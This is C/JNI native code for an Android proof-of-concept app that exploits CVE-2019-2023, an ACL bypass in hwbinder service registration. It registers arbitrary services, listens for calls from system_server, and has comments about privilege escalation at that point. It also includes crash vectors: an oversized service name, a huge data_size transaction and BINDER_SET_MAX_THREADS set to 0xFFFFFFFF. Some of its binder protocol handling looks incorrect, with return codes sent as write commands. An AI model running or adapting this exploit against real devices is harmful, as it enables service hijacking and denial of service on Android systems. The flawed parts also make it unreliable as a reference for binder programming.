#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <poll.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;
static jobject g_callback_obj = NULL;
static jmethodID g_appendLog_mid = NULL;

/* ログをJavaへ即時送信するコールバック */
static void jni_append_log(const char* msg) {
    if (g_vm == NULL || g_callback_obj == NULL || g_appendLog_mid == NULL) {
        LOGI("%s", msg); // fallback
        return;
    }
    JNIEnv* env;
    int status = (*g_vm)->GetEnv(g_vm, (void**)&env, JNI_VERSION_1_6);
    if (status == JNI_EDETACHED) {
        (*g_vm)->AttachCurrentThread(g_vm, &env, NULL);
    }
    if (env == NULL) return;
    jstring jmsg = (*env)->NewStringUTF(env, msg);
    (*env)->CallVoidMethod(env, g_callback_obj, g_appendLog_mid, jmsg);
    (*env)->DeleteLocalRef(env, jmsg);
    if (status == JNI_EDETACHED) {
        (*g_vm)->DetachCurrentThread(g_vm);
    }
}

static volatile int g_exploit_success = 0;
static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";
static pid_t g_hwservicemanager_pid = -1;

/* ----- ACL Bypass (CVE-2019-2023) でサービスを登録 ----- */
static int exploit_cve_2019_2023(const char *service_name, int *out_handle) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;

    char log_buf[512];
    snprintf(log_buf, sizeof(log_buf), "[CVE-2019-2023] registering '%s'...", service_name);
    jni_append_log(log_buf);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;  // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    jni_append_log("ADD_SERVICE succeeded!");

    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;  // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl GET_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        LOGE("No handle returned");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    snprintf(log_buf, sizeof(log_buf), "Service handle: %d", handle);
    jni_append_log(log_buf);
    close(hwbinder_fd);
    if (out_handle) *out_handle = handle;
    return 0;
}

/* ----- サーバーループ（トランザクション待ち受け） ----- */
static int binder_server_loop(int binder_fd) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    jni_append_log("Binder server loop started, waiting for transactions...");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            LOGE("ioctl read failed: %s", strerror(errno));
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        if (cmd_code == BR_NOOP) {
            continue;
        }

        char log_buf[128];
        snprintf(log_buf, sizeof(log_buf), "Received cmd=0x%x, size=%zu", cmd_code, payload_size);
        jni_append_log(log_buf);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            snprintf(log_buf, sizeof(log_buf), "Transaction from uid=%d, code=%d", t->sender_euid, t->code);
            jni_append_log(log_buf);

            if (t->sender_euid == 1000) {
                jni_append_log("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
                // ここで特権昇格処理を行う（ただし seccomp があるので直接 setuid は不可）
                // 代わりに応答に何か仕込むか、ファイルディスクリプタを要求する
                g_exploit_success = 1;
            }

            // 応答を返す（BR_OK + BR_TRANSACTION_COMPLETE）
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            snprintf(log_buf, sizeof(log_buf), "Transaction #%d handled.", transaction_count);
            jni_append_log(log_buf);
        } else if (cmd_code == BR_DEAD_BINDER) {
            jni_append_log("Received DEAD_BINDER");
            break;
        } else {
            snprintf(log_buf, sizeof(log_buf), "Unhandled cmd=0x%x", cmd_code);
            jni_append_log(log_buf);
        }
    }
    return transaction_count;
}

/* ----- サービスを登録し、サーバーを起動（fork） ----- */
static void register_and_serve(const char *service_name) {
    int handle;
    if (exploit_cve_2019_2023(service_name, &handle) < 0) {
        char buf[256];
        snprintf(buf, sizeof(buf), "Failed to register '%s'", service_name);
        jni_append_log(buf);
        return;
    }

    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder for server failed: %s", strerror(errno));
        return;
    }

    // BC_ENTER_LOOPER を送信してサーバーモードに
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // 子プロセス：サーバーループを実行
        binder_server_loop(binder_fd);
        _exit(0);
    } else if (pid > 0) {
        char buf[64];
        snprintf(buf, sizeof(buf), "Server for '%s' started (PID %d)", service_name, pid);
        jni_append_log(buf);
        close(binder_fd);
    } else {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
    }
}

/* ----- システムにトランザクションを送信（system_server をターゲット） ----- */
static void send_transaction_to_system(void) {
    jni_append_log("Sending transaction to system_server (handle 0) ...");
    int fd = open("/dev/hwbinder", O_RDWR);
    if (fd < 0) {
        LOGE("open failed");
        return;
    }

    // 空のトランザクションを送信
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;  // context manager
    tx.tdata.code = 0;
    tx.tdata.flags = TF_ONE_WAY; // one-way で返答を待たない
    tx.tdata.data_size = 0;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        jni_append_log("Transaction sent successfully (one-way)");
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "Transaction send failed: %s", strerror(errno));
        jni_append_log(buf);
    }
    close(fd);
}

/* ----- クラッシュベクター（オプション） ----- */
static int crash_with_huge_name(void) {
    jni_append_log("Trying crash with 8KB service name...");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    int handle;
    int ret = exploit_cve_2019_2023(payload, &handle);
    free(payload);
    return ret;
}

static int send_huge_data_transaction(void) {
    jni_append_log("Sending transaction with huge data_size...");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    if (ret == 0) {
        jni_append_log("Huge data transaction succeeded unexpectedly");
        return 0;
    } else {
        jni_append_log("Huge data transaction failed (expected)");
        return -1;
    }
}

static int crash_set_max_threads(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }
    uint32_t max_threads = 0xFFFFFFFF;
    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    close(hwbinder_fd);
    if (ret == 0) jni_append_log("BINDER_SET_MAX_THREADS succeeded");
    else jni_append_log("BINDER_SET_MAX_THREADS failed");
    return ret;
}

/* ----- JNI エクスポート ----- */
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGD("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL
Java_com_example_tzpoc_MainActivity_nativeSetCallback(JNIEnv* env, jclass clazz, jobject callback) {
    if (g_callback_obj != NULL) {
        (*env)->DeleteGlobalRef(env, g_callback_obj);
    }
    g_callback_obj = (*env)->NewGlobalRef(env, callback);
    jclass cls = (*env)->GetObjectClass(env, callback);
    g_appendLog_mid = (*env)->GetMethodID(env, cls, "appendLog", "(Ljava/lang/String;)V");
    if (g_appendLog_mid == NULL) {
        LOGE("Failed to get method ID for appendLog");
    }
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeAddServiceOnly(JNIEnv* env, jclass clazz, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    int handle;
    int ret = exploit_cve_2019_2023(name, &handle);
    (*env)->ReleaseStringUTFChars(env, jname, name);
    if (ret == 0) return handle;
    return -1;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeStartServer(JNIEnv* env, jclass clazz, jint handle) {
    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        binder_server_loop(binder_fd);
        _exit(0);
    } else if (pid > 0) {
        char buf[64];
        snprintf(buf, sizeof(buf), "Server started (PID %d)", pid);
        jni_append_log(buf);
        close(binder_fd);
        return pid;
    } else {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
}

JNIEXPORT void JNICALL
Java_com_example_tzpoc_MainActivity_nativeRegisterAndServe(JNIEnv* env, jclass clazz, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return;
    register_and_serve(name);
    (*env)->ReleaseStringUTFChars(env, jname, name);
}

JNIEXPORT void JNICALL
Java_com_example_tzpoc_MainActivity_nativeSendTransactionToSystem(JNIEnv* env, jclass clazz) {
    send_transaction_to_system();
}

JNIEXPORT void JNICALL
Java_com_example_tzpoc_MainActivity_nativeCrashVectors(JNIEnv* env, jclass clazz) {
    jni_append_log("=== Running crash vectors ===");
    crash_with_huge_name();
    usleep(100000);
    send_huge_data_transaction();
    usleep(100000);
    crash_set_max_threads();
    usleep(100000);
    jni_append_log("Crash vectors completed.");
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetKernelInfo(JNIEnv* env, jclass clazz) {
    // 簡易的な情報収集（オフセット確認用）
    char result[512] = {0};
    int fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            snprintf(result, sizeof(result), "Kernel: %s", buf);
        }
    }
    return (*env)->NewStringUTF(env, result);
}
